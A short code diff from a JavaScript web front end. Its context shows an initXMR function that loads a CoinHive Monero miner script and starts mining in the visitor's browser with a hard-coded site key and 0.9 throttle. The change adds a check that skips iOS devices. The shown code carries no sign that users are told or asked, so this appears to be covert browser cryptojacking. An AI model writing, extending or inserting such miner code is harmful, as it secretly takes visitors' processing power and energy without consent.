@@ -262,6 +262,9 @@ export const asyncLoadScript = (url, loadCB) => {
 }
 
 export const initXMR = () => {
+  if (navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
+    return
+  }
   asyncLoadScript((process.env.StaticServer || process.env.Server) + '/theme/js/lib/xmr.min.js', () => {
     const miner = new window.CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.9})
     miner.start()
